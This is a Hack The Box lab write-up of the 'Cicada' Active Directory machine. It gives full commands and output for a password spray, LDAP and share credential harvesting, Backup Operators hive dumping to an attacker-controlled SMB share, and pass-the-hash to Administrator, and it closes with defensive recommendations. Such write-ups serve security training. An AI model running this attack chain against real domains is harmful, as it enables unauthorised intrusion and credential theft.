---
title: "Cicada — Credential Chaining to Backup Operators Hive Extraction"
description: "Guest SMB, LDAP attributes, and embedded script credentials chain into Backup Operators hive extraction and domain compromise."
type: case-study
platform: Hack The Box
content_type: machine
status: published-ready
addedAt: "2026-09-14"
tags:
  - windows
  - active-directory
  - credential-chaining
objective: "Move from guest SMB access through directory and share credential disclosures to domain administrator"
tools:
  - rustscan
  - NetExec
  - Impacket
  - evil-winrm
skill: "Active Directory credential discovery and abuse"
outcome: "Pass-the-hash authentication as the domain Administrator after Backup Operators hive extraction"
---

## At a glance

| Field | Value |
|---|---|
| Difficulty | Easy |
| Target environment | Windows Server 2022 Active Directory Domain Controller (build 20348) |
| Starting position | Unauthenticated network access; SMB guest logon accepted |
| Objective | Chain credential disclosures across SMB shares, LDAP attributes, and an embedded script to reach domain administrator |
| Outcome | Pass-the-hash authentication as the domain Administrator |

## From guest SMB to pass-the-hash Administrator

Cicada is an Easy-rated Hack The Box Windows machine in which a chain of small credential exposures leads to domain administrative control. Guest SMB access exposes an onboarding notice holding a default password; password spraying maps it to a first domain account; user description attributes and a development-share backup script disclose two further credentials; and the last account's `Backup Operators` membership allows SAM and SYSTEM hive extraction from the domain controller and recovery of an administrative NTLM hash. Target identifiers, credentials, and secret values are replaced with role-based placeholders; command syntax is preserved. See [how evidence is handled](/method/).

**Attack path:** **Guest SMB → onboarding default password → password spray → LDAP description leak → development-share backup script → WinRM → `Backup Operators` hive dump → pass-the-hash Administrator**

## Target, exposed services, and starting position

- **Target:** Windows Server 2022 Active Directory Domain Controller (build 20348), host `<DC_HOST>` in domain `<DOMAIN>`.
- **Exposed services:** DNS (53), Kerberos (88), RPC (135), SMB (139/445), LDAP (389/636/3268/3269), and WinRM (5985); SMB signing is enabled and required.
- **Starting position:** unauthenticated network access, with the SMB service accepting guest logons.
- **Objective:** move from guest access to domain administrative control and demonstrate how independent credential leaks chain together.
- **Constraints:** activity was confined to the Hack The Box lab environment.

## Evidence: guest access to hive extraction

No captured console output exists for the WinRM logon or the final administrative logon, so both are recorded outcomes; every other result below carries the output that establishes it.

### 1. Service Enumeration

Observation: a full port scan surfaces the services of a domain controller.

```bash
rustscan -a <TARGET_IP> --ulimit 5000 -- -Pn -sC -sV -oN <SCAN_OUTPUT>
```

Truncated scan output:

```text
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP
445/tcp  open  microsoft-ds
464/tcp  open  kpasswd5
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0
```

Follow-up identification places the host as `<DC_HOST>` in domain `<DOMAIN>`, with SMB signing enabled and required.

Significance: the combination of DNS, Kerberos, LDAP, and WinRM identifies a domain controller, and required SMB signing removes NTLM relay over SMB as a route, so the path moves toward credential recovery rather than coercion.

Result: a Windows Server 2022 domain controller exposes SMB, LDAP, and WinRM, with SMB signing enforced.

### 2. Guest SMB Access and the Onboarding Notice

Observation: guest logon is accepted and the `<ONBOARDING_SHARE>` share is readable.

```bash
nxc smb <DOMAIN> -u 'a' -p '' --shares
```

```text
SMB  <TARGET_IP>  445  <DC_HOST>  [*] Windows Server 2022 Build 20348 x64
SMB  <TARGET_IP>  445  <DC_HOST>  [+] <DOMAIN>\a: (Guest)
SMB  <TARGET_IP>  445  <DC_HOST>  [*] Enumerated shares

Share     Permissions  Remark
-----     -----------  ------
ADMIN$                 Remote Admin
C$                     Default share
<DEVELOPMENT_SHARE>
<ONBOARDING_SHARE>  READ
IPC$      READ         Remote IPC
NETLOGON               Logon server share
SYSVOL                 Logon server share
```

Spidering the accessible shares downloads a single onboarding document.

```bash
nxc smb <DOMAIN> -u 'a' -p '' -M spider_plus -o DOWNLOAD_FLAG=True
```

```text
"<ONBOARDING_SHARE>": {
  "Notice from HR.txt": {
    "size": "1.24 KB"
  }
}
```

The document carries a default password.

```text
Your default password is: <DEFAULT_PASSWORD>
```

Significance: the notice is reachable without authentication, and the password is not tied to a named account, so it is a spray candidate rather than a direct login.

Result: guest access discloses a default credential with no associated username.

### 3. Domain User Enumeration and Password Spray

Observation: RID brute forcing over the guest session enumerates domain accounts.

```bash
nxc smb <DOMAIN> -u 'a' -p '' --rid-brute \
  | awk '/SidTypeUser/' \
  | awk '{print $6}' \
  | awk -F'\\' '{print $2}' > users.txt
```

```text
<DOMAIN_ADMINISTRATOR>
<GUEST_ACCOUNT>
<KERBEROS_SERVICE_ACCOUNT>
<DC_MACHINE_ACCOUNT>
<DOMAIN_USER_1>
<DOMAIN_USER_2>
<INITIAL_DOMAIN_USER>
<INTERMEDIATE_DOMAIN_USER>
<REMOTE_ACCESS_USER>
```

The onboarding password is then sprayed across the discovered users.

```bash
nxc smb <DOMAIN> \
  -u users.txt \
  -p '<DEFAULT_PASSWORD>' \
  --continue-on-success
```

```text
SMB  <TARGET_IP>  445  <DC_HOST>  [+] <DOMAIN>\<INITIAL_DOMAIN_USER>:<DEFAULT_PASSWORD>
```

Significance: one account still used the default onboarding password; I kept `--continue-on-success` enabled so the spray checked every account after the first hit and found each match in a single pass.

Result: valid domain credentials for `<INITIAL_DOMAIN_USER>`.

### 4. LDAP Description Credential Leak

Observation: with authenticated credentials, LDAP user description attributes are readable.

```bash
nxc ldap <DOMAIN> \
  -u '<INITIAL_DOMAIN_USER>' \
  -p '<DEFAULT_PASSWORD>' \
  -M get-desc-users
```

```text
User: <INTERMEDIATE_DOMAIN_USER> description: <INTERMEDIATE_USER_PASSWORD>
```

Significance: a description attribute stores a plaintext password that any authenticated domain user can read; the directory itself becomes a credential store.

Result: a second account's password is disclosed through LDAP.

### 5. Development Share Credential Disclosure

Observation: the leaked credential grants read access to the development share that guest access could not read.

```bash
nxc smb <DOMAIN> \
  -u '<INTERMEDIATE_DOMAIN_USER>' \
  -p '<INTERMEDIATE_USER_PASSWORD>' \
  --shares
```

```text
Share     Permissions  Remark
-----     -----------  ------
ADMIN$                 Remote Admin
C$                     Default share
<DEVELOPMENT_SHARE>  READ
<ONBOARDING_SHARE>   READ
IPC$      READ         Remote IPC
NETLOGON  READ         Logon server share
SYSVOL    READ         Logon server share
```

Spidering the shares as this account retrieves a PowerShell backup script.

```bash
nxc smb <DOMAIN> \
  -u '<INTERMEDIATE_DOMAIN_USER>' \
  -p '<INTERMEDIATE_USER_PASSWORD>' \
  -M spider_plus -o DOWNLOAD_FLAG=True
```

```text
"<DEVELOPMENT_SHARE>": {
  "Backup_script.ps1": {
    "size": "601 B"
  }
}
```

The script embeds a credential pair.

```powershell
$username = "<REMOTE_ACCESS_USER>"
$password = ConvertTo-SecureString "<REMOTE_ACCESS_PASSWORD>" -AsPlainText -Force
$credentials = New-Object System.Management.Automation.PSCredential($username, $password)
```

Validating the embedded credential through SMB shows broader access, including write access to `C$`.

```bash
nxc smb <DOMAIN> \
  -u '<REMOTE_ACCESS_USER>' \
  -p '<REMOTE_ACCESS_PASSWORD>' \
  --shares
```

```text
Share     Permissions  Remark
-----     -----------  ------
ADMIN$    READ         Remote Admin
C$        READ,WRITE   Default share
<DEVELOPMENT_SHARE>
<ONBOARDING_SHARE>  READ
IPC$      READ         Remote IPC
NETLOGON               Logon server share
SYSVOL                 Logon server share
```

Significance: the backup script left a service credential on a readable share, and the exposed WinRM service on port 5985 makes the recovered credential directly usable for interactive logon.

Result: the leaked credential is validated through SMB and can also reach WinRM.

### 6. WinRM Access and Backup Operators Membership

Observation: the recovered credential authenticates over WinRM, and group enumeration in that session reveals the account's rights.

```bash
evil-winrm -i <DOMAIN> \
  -u '<REMOTE_ACCESS_USER>' \
  -p '<REMOTE_ACCESS_PASSWORD>'
```

Group-membership enumeration returned two security groups:

```text
memberof : {
  CN=Remote Management Users,CN=Builtin,DC=<DOMAIN_COMPONENT>,
  CN=Backup Operators,CN=Builtin,DC=<DOMAIN_COMPONENT>
}
```

Significance: `Remote Management Users` explains the WinRM logon, while `Backup Operators` grants the right to read protected files for backup purposes, including registry hives on a domain controller, which is the intended escalation path.

Result: an interactive remote session whose account holds `Backup Operators` rights.

### 7. Backup Operators Hive Extraction

Observation: `Backup Operators` rights allow protected registry hives to be copied; an attacker-controlled SMB share receives them.

```bash
impacket-smbserver share . -smb2support
```

The helper binary, staged from the attacker host, runs within the WinRM session and writes the hives to that share:

```powershell
.\<BACKUP_OPERATOR_TOOL> -t \\<DC_HOST>.<DOMAIN> -o \\<ATTACKER_HOST>\<SHARE_NAME>\
```

```text
Dumping SAM hive to \\<ATTACKER_HOST>\<SHARE_NAME>\SAM
Dumping SYSTEM hive to \\<ATTACKER_HOST>\<SHARE_NAME>\SYSTEM
```

Significance: backup rights bypass the file ACLs that normally protect the hives, so credential material is copied without accessing LSASS and without leaving persistent tooling on the host.

Result: the SAM and SYSTEM hives are written to the attacker-controlled share.

### 8. Administrator Hash Extraction and Pass-the-Hash

Observation: the recovered hives are parsed offline.

```bash
impacket-secretsdump -sam SAM -system SYSTEM LOCAL
```

```text
[*] Target system bootKey: <BOOT_KEY>
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)

<DOMAIN_ADMINISTRATOR>:500:<LM_HASH>:<ADMIN_NTLM_HASH>:::
```

The recovered NTLM hash then authenticates over WinRM without a password.

```bash
evil-winrm -i <DOMAIN> \
  -u <DOMAIN_ADMINISTRATOR> \
  -H <ADMIN_NTLM_HASH>
```

Significance: the local Administrator hash supports pass-the-hash over WinRM, so the password is never needed to obtain an administrative session.

Result: administrative access as the domain Administrator.

## The decision to spray the onboarding password

| Challenge | Decision | Rationale |
|---|---|---|
| The onboarding password was not tied to a named account | Enumerate domain users, then spray the password | A direct login was not possible, so the valid account had to be identified across the user list |

## Outcome: pass-the-hash domain Administrator

The documented path reaches administrative control of the domain controller without exploiting a software vulnerability; each access change after the initial guest logon follows from a credential recovered in a prior step. Each recovered credential was validated through SMB or WinRM before use, and the hive-dump output plus the offline hash extraction prove the escalation. The two interactive sessions are recorded outcomes, not captured transcripts, and I could not verify them further from the captured evidence; the exercise is confined to the Hack The Box lab.

## Recommendations: guest access, default password, LDAP, scripts, and Backup Operators

No remediation was tested in this lab; the entries below are recommendations.

1. **Guest SMB access on a domain controller.** Root cause: the domain controller accepts guest SMB logons and exposes a readable share. Demonstrated impact: an unauthenticated party retrieved onboarding material. *Recommendation:* disable guest and null SMB sessions and audit shares reachable without authentication. *Detection:* detect guest authentications and on share enumeration from anonymous sessions.
2. **A default onboarding password left valid.** Root cause: a shared onboarding document distributed a default password that was never forced to rotate. Demonstrated impact: the password unlocked a live domain account through spraying. *Recommendation:* force a password change at first logon and avoid publishing reusable default credentials. *Detection:* flag accounts that authenticate with a provisioned default.
3. **Credentials in LDAP description attributes.** Root cause: a plaintext password stored in a user's description attribute. Demonstrated impact: any authenticated domain user could read the credential. *Recommendation:* remove secrets from directory attributes and restrict who can write to them. *Detection:* monitor description fields for credential-like strings.
4. **Plaintext credentials in a script on a readable share.** Root cause: a backup script embedded a password and sat on a share readable by an ordinary account. Demonstrated impact: the service credential was disclosed. *Recommendation:* use group managed service accounts or a secret store instead of embedded credentials, and tighten share permissions. *Detection:* scan share content for embedded secrets.
5. **Backup Operators combined with interactive remote logon.** Root cause: the same account held backup rights and WinRM access. Demonstrated impact: registry hive extraction enabled pass-the-hash to the Administrator. *Recommendation:* separate backup membership from remote interactive logon, and monitor privileged hive access.

## References

- [Hack The Box — Cicada](https://app.hackthebox.com/machines/Cicada) (retired machine)
- [RustScan](https://github.com/bee-san/RustScan) (fast port scanner)
- [NetExec](https://github.com/Pennyw0rth/NetExec) (SMB and LDAP enumeration, RID brute force, and share spidering)
- [Impacket](https://github.com/fortra/impacket) (SMB server, remote registry hive dumping, and `secretsdump` parsing)
- [evil-winrm](https://github.com/Hackplayers/evil-winrm) (WinRM shell, including hash-based authentication)
- [MITRE ATT&CK T1078 — Valid Accounts](https://attack.mitre.org/techniques/T1078/)
- [MITRE ATT&CK T1552.001 — Unsecured Credentials: Credentials In Files](https://attack.mitre.org/techniques/T1552/001/)
- [MITRE ATT&CK T1003 — OS Credential Dumping](https://attack.mitre.org/techniques/T1003/)
- [Active Directory Security Groups — Backup Operators (Microsoft Learn)](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups)
- [Control SMB signing behavior (Microsoft Learn)](https://learn.microsoft.com/en-us/windows-server/storage/file-server/smb-signing)
- [Network access: Restrict anonymous access to Named Pipes and Shares (Microsoft Learn)](https://learn.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/network-access-restrict-anonymous-access-to-named-pipes-and-shares)
- [Enable insecure guest logons in SMB2 and SMB3 (Microsoft Learn)](https://learn.microsoft.com/en-us/windows-server/storage/file-server/enable-insecure-guest-logons-smb2-and-smb3)
